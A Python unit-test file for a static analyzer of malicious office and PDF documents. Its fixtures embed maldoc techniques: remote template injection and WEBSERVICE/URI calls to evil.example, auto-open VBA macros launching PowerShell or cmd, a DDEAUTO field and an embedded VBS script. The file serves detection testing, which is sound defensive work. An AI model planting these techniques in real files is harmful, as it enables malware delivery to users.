from __future__ import annotations

import sys
import tempfile
import unittest
import zipfile
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1] / "src"))

from moda.core.engine import AnalyzerEngine
from moda.analyzers.ole import OLEAnalyzer
from moda.core.context import AnalysisContext


def analyze_bytes(file_name: str, data: bytes):
    with tempfile.TemporaryDirectory() as temp_dir:
        sample = Path(temp_dir) / file_name
        sample.write_bytes(data)
        return AnalyzerEngine(skip_yara=True).analyze_file(sample)


def build_ooxml(path: Path, files: dict[str, str | bytes]) -> None:
    with zipfile.ZipFile(path, "w") as archive:
        archive.writestr(
            "[Content_Types].xml",
            '<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"/>',
        )
        if "word/document.xml" not in files:
            archive.writestr(
                "word/document.xml",
                '<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"/>',
            )
        for name, data in files.items():
            archive.writestr(name, data)


def build_ooxml_package(path: Path, files: dict[str, str | bytes]) -> None:
    with zipfile.ZipFile(path, "w") as archive:
        archive.writestr(
            "[Content_Types].xml",
            '<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"/>',
        )
        for name, data in files.items():
            archive.writestr(name, data)


class StaticAnalyzerTests(unittest.TestCase):
    def test_pdf_suspicious_actions_are_flagged(self) -> None:
        result = analyze_bytes(
            "suspicious.pdf",
            (
                b"%PDF-1.7\n"
                b"1 0 obj << /OpenAction 2 0 R /JS (app.alert(1)) "
                b"/JavaScript 3 0 R /Launch << >> /EmbeddedFile << >> "
                b"/URI (http://evil.example/payload) >> endobj\n%%EOF"
            ),
        )

        titles = {finding.title for finding in result.findings}
        self.assertIn("PDF JavaScript", titles)
        self.assertIn("PDF OpenAction", titles)
        self.assertIn("PDF Launch Action", titles)
        self.assertIn("PDF Embedded File", titles)
        self.assertEqual(result.risk_level, "critical")

    def test_rtf_embedded_object_and_exploit_hints_are_flagged(self) -> None:
        result = analyze_bytes(
            "exploit.rtf",
            ("{\\rtf1{\\object\\objclass Equation.3{\\objdata " + "41" * 300 + "}}}").encode(),
        )

        titles = {finding.title for finding in result.findings}
        self.assertIn("RTF Embedded Object Data", titles)
        self.assertIn("RTF Exploit Indicator", titles)
        self.assertIn("Large RTF Hex Blob", titles)

    def test_unsupported_pe_is_reported_as_inconclusive(self) -> None:
        result = analyze_bytes("sample.exe", b"MZ" + b"\x00" * 512)

        titles = {finding.title for finding in result.findings}
        self.assertEqual(result.file_type, "unknown")
        self.assertIn("Unsupported File Type", titles)
        self.assertEqual(result.risk_level, "medium")
        self.assertGreaterEqual(result.risk_score, 26)
        self.assertIn("unsupported_file_type", result.extra)

    def test_generic_zip_is_not_misclassified_as_docx(self) -> None:
        with tempfile.TemporaryDirectory() as temp_dir:
            sample = Path(temp_dir) / "sample.zip"
            with zipfile.ZipFile(sample, "w") as archive:
                archive.writestr("payload.bin", b"MZ" + b"\x00" * 64)
            result = AnalyzerEngine(skip_yara=True).analyze_file(sample)

        titles = {finding.title for finding in result.findings}
        self.assertEqual(result.file_type, "unknown")
        self.assertIn("Unsupported File Type", titles)
        self.assertEqual(result.risk_level, "medium")

    def test_ooxml_remote_relationship_and_macro_patterns_are_flagged(self) -> None:
        with tempfile.TemporaryDirectory() as temp_dir:
            sample = Path(temp_dir) / "remote_macro.docm"
            build_ooxml(
                sample,
                {
                    "word/_rels/document.xml.rels": (
                        '<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
                        '<Relationship Id="rId1" '
                        'Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" '
                        'Target="http://evil.example/template.dotm" TargetMode="External"/>'
                        "</Relationships>"
                    ),
                    "word/vbaProject.bin": (
                        'Sub AutoOpen()\n'
                        'CreateObject("WScript.Shell").Run "powershell -enc AAAA"\n'
                        "End Sub"
                    ).encode(),
                },
            )
            result = AnalyzerEngine(skip_yara=True).analyze_file(sample)

        titles = {finding.title for finding in result.findings}
        self.assertIn("VBA Macros Present", titles)
        self.assertIn("Macro Auto-Execution Trigger", titles)
        self.assertIn("Macro Process Execution", titles)
        self.assertIn("Remote Document Relationships", titles)

    def test_malicious_docx_without_macro_project_is_flagged(self) -> None:
        with tempfile.TemporaryDirectory() as temp_dir:
            sample = Path(temp_dir) / "template_injection.docx"
            build_ooxml(
                sample,
                {
                    "word/_rels/settings.xml.rels": (
                        '<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
                        '<Relationship Id="rIdTpl" '
                        'Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" '
                        'Target="https://evil.example/payload.dotm" TargetMode="External"/>'
                        "</Relationships>"
                    ),
                    "word/document.xml": (
                        '<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">'
                        "<w:body><w:p><w:r><w:instrText>DDEAUTO cmd.exe /c calc</w:instrText></w:r></w:p></w:body>"
                        "</w:document>"
                    ),
                },
            )
            result = AnalyzerEngine(skip_yara=True).analyze_file(sample)

        titles = {finding.title for finding in result.findings}
        self.assertIn("High-Risk External OOXML Relationship", titles)
        self.assertIn("OOXML DDE Field", titles)
        self.assertIn("Suspicious Command Text In OOXML", titles)
        self.assertGreaterEqual(result.risk_score, 75)
        self.assertEqual(result.risk_level, "critical")
        components = result.score_breakdown["components"]
        self.assertTrue(any(component["key"] == "relationship" for component in components))
        self.assertTrue(any(component["key"] == "macro" for component in components))

    def test_excel_macro_enabled_variants_are_supported(self) -> None:
        for file_name in ("addin.xlam", "template.xltm", "binary.xlsb"):
            with self.subTest(file_name=file_name):
                with tempfile.TemporaryDirectory() as temp_dir:
                    sample = Path(temp_dir) / file_name
                    build_ooxml_package(
                        sample,
                        {
                            "xl/workbook.bin" if file_name.endswith(".xlsb") else "xl/workbook.xml": (
                                '<workbook xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main"/>'
                            ),
                            "xl/vbaProject.bin": b"Sub Auto_Open()\nShell \"cmd.exe\"\nEnd Sub",
                        },
                    )
                    result = AnalyzerEngine(skip_yara=True).analyze_file(sample)

                self.assertEqual(result.file_type, "ooxml_xlsm")
                self.assertTrue(any(finding.title == "VBA Macros Present" for finding in result.findings))

    def test_excel_connections_formulas_and_hidden_sheets_are_flagged(self) -> None:
        with tempfile.TemporaryDirectory() as temp_dir:
            sample = Path(temp_dir) / "suspicious.xlsx"
            build_ooxml_package(
                sample,
                {
                    "xl/workbook.xml": (
                        '<workbook xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main">'
                        '<sheets><sheet name="stage" sheetId="1" state="veryHidden"/></sheets>'
                        "</workbook>"
                    ),
                    "xl/worksheets/sheet1.xml": (
                        '<worksheet xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main">'
                        "<sheetData><row><c><f>WEBSERVICE(\"http://evil.example/a\")</f></c></row></sheetData>"
                        "</worksheet>"
                    ),
                    "xl/connections.xml": "<connections><connection name=\"remote\"/></connections>",
                    "xl/externalLinks/externalLink1.xml": "<externalLink/>",
                },
            )
            result = AnalyzerEngine(skip_yara=True).analyze_file(sample)

        titles = {finding.title for finding in result.findings}
        self.assertEqual(result.file_type, "ooxml_xlsx")
        self.assertIn("Excel External Links", titles)
        self.assertIn("Excel Data Connections", titles)
        self.assertIn("Suspicious Excel Formula", titles)
        self.assertIn("Excel Very Hidden Sheet", titles)

    def test_ooxml_embedded_script_is_flagged(self) -> None:
        with tempfile.TemporaryDirectory() as temp_dir:
            sample = Path(temp_dir) / "embedded.docx"
            build_ooxml(
                sample,
                {"word/embeddings/payload.vbs": 'CreateObject("WScript.Shell").Run "cmd.exe /c calc"'},
            )
            result = AnalyzerEngine(skip_yara=True).analyze_file(sample)

        titles = {finding.title for finding in result.findings}
        self.assertIn("Embedded Script", titles)
        self.assertEqual(result.risk_level, "high")

    def test_ole_helper_flags_vba_objectpool_and_activex(self) -> None:
        class FakeStream:
            def read(self) -> bytes:
                return b"Sub AutoOpen()\nCreateObject(\"WScript.Shell\")\nEnd Sub"

        class FakeOLE:
            def listdir(self):
                return [
                    ["Macros", "VBA", "Module1"],
                    ["ObjectPool", "_123456"],
                    ["ActiveX", "Control1"],
                    ["Package"],
                ]

            def exists(self, path: str) -> bool:
                return path in {"Macros/VBA", "VBA/dir"}

            def openstream(self, stream):
                return FakeStream()

        context = AnalysisContext("sample.doc", b"\xd0\xcf\x11\xe0" + b"\x00" * 512)
        analyzer = OLEAnalyzer()
        analyzer._inspect_streams(context, FakeOLE())
        analyzer._check_vba_storage(context, FakeOLE())
        analyzer._check_activex(context, FakeOLE())

        titles = {finding.title for finding in context.findings}
        self.assertIn("OLE Object Pool", titles)
        self.assertIn("OLE Embedded Package Stream", titles)
        self.assertIn("VBA Macros Present", titles)
        self.assertIn("ActiveX Controls Present", titles)
        self.assertIn("AutoOpen", "\n".join(context.macro_code))

    def test_ole_helper_flags_encrypted_package_and_dde_hints(self) -> None:
        class FakeOLE:
            def listdir(self):
                return [
                    ["EncryptedPackage"],
                    ["EncryptionInfo"],
                    ["ObjectPool", "Equation Native"],
                    ["DDE", "LinkInfo"],
                ]

        context = AnalysisContext("encrypted.doc", b"\xd0\xcf\x11\xe0" + b"\x00" * 512)
        analyzer = OLEAnalyzer()
        analyzer._inspect_streams(context, FakeOLE())

        titles = {finding.title for finding in context.findings}
        self.assertIn("Encrypted Office Package", titles)
        self.assertIn("OLE Exploit-Or-DDE Hint", titles)


if __name__ == "__main__":
    unittest.main()
